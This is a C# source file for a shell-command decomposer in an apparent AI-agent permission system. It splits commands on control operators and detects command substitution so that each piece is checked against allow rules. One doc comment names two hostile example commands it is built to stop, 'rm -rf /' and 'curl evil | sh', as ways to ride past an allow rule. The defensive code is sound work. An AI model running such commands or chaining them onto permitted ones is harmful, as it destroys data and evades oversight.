namespace Zdtllm.Permissions;

/// <summary>
/// Splits a shell command line into the independent sub-commands a shell would run, so each
/// piece can be checked against the permission rules on its own. Without this an allow rule like
/// <c>Bash(git diff *)</c> — compiled to the unanchored regex <c>^git diff.*$</c> — silently
/// permits <c>git diff &amp;&amp; rm -rf /</c> or <c>git diff; curl evil | sh</c>, because the whole
/// command string still matches the rule. Decomposing on the shell control operators and requiring
/// EVERY segment to be independently allowed closes that hole.
///
/// <para>
/// The splitter is quote- and escape-aware: operators inside single or double quotes, or escaped
/// with a backslash, are NOT treated as separators. The security property we care about is that we
/// never MISS a real operator (that would let a dangerous suffix ride along on an allow rule). Over-
/// splitting is harmless — a spuriously split segment simply fails to match a narrow allow rule and
/// the whole command falls back to Ask, which fails closed.
/// </para>
/// </summary>
public static class BashCommandDecomposer
{
    // Two-character operators checked before single-character ones so "&&"/"||" aren't mistaken
    // for a background "&" followed by junk.
    private static readonly string[] TwoCharOps = { "&&", "||", ";;" };

    /// <summary>
    /// Break <paramref name="command"/> into its top-level sub-commands. Separators recognised
    /// outside quotes: <c>&amp;&amp;</c>, <c>||</c>, <c>;</c>, <c>|</c>, <c>&amp;</c>, and newlines.
    /// Returns the trimmed non-empty segments; a command with no operators yields a single element.
    /// Never returns an empty list (a blank command yields one blank-trimmed element via the
    /// fallback so callers always have something to evaluate).
    /// </summary>
    public static IReadOnlyList<string> Decompose(string command)
    {
        ArgumentNullException.ThrowIfNull(command);

        var segments = new List<string>();
        var current = new System.Text.StringBuilder();
        var inSingle = false;
        var inDouble = false;

        for (var i = 0; i < command.Length; i++)
        {
            var c = command[i];

            if (c == '\\' && !inSingle)
            {
                // Backslash escapes the next char (outside single quotes). Keep both so the
                // segment text is preserved for display/matching; an escaped operator is literal.
                current.Append(c);
                if (i + 1 < command.Length) current.Append(command[++i]);
                continue;
            }

            if (c == '\'' && !inDouble) { inSingle = !inSingle; current.Append(c); continue; }
            if (c == '"' && !inSingle) { inDouble = !inDouble; current.Append(c); continue; }

            if (inSingle || inDouble)
            {
                current.Append(c);
                continue;
            }

            // Two-char operators first.
            if (i + 1 < command.Length)
            {
                var pair = command.Substring(i, 2);
                if (Array.IndexOf(TwoCharOps, pair) >= 0)
                {
                    Flush(segments, current);
                    i++; // consume the second operator char
                    continue;
                }
            }

            if (c is ';' or '|' or '&' or '\n' or '\r')
            {
                Flush(segments, current);
                continue;
            }

            current.Append(c);
        }

        Flush(segments, current);

        if (segments.Count == 0) segments.Add(command.Trim());
        return segments;
    }

    /// <summary>
    /// True when the command contains a command-substitution or process-substitution construct
    /// (<c>$(...)</c>, backticks, <c>&lt;(...)</c>, <c>&gt;(...)</c>) OUTSIDE single quotes — i.e. a
    /// place a shell would run another, unvetted command. A narrow allow rule cannot vouch for the
    /// embedded command, so the caller downgrades an otherwise-Allow decision to Ask when this is
    /// true. Single-quoted spans are ignored because the shell treats their contents literally.
    /// </summary>
    public static bool HasCommandSubstitution(string command)
    {
        ArgumentNullException.ThrowIfNull(command);

        var inSingle = false;
        for (var i = 0; i < command.Length; i++)
        {
            var c = command[i];
            if (c == '\\') { i++; continue; } // skip escaped char
            if (c == '\'') { inSingle = !inSingle; continue; }
            if (inSingle) continue;

            if (c == '`') return true;
            if (c == '$' && i + 1 < command.Length && command[i + 1] == '(') return true;
            if ((c == '<' || c == '>') && i + 1 < command.Length && command[i + 1] == '(') return true;
        }
        return false;
    }

    private static void Flush(List<string> segments, System.Text.StringBuilder current)
    {
        var seg = current.ToString().Trim();
        if (seg.Length > 0) segments.Add(seg);
        current.Clear();
    }
}
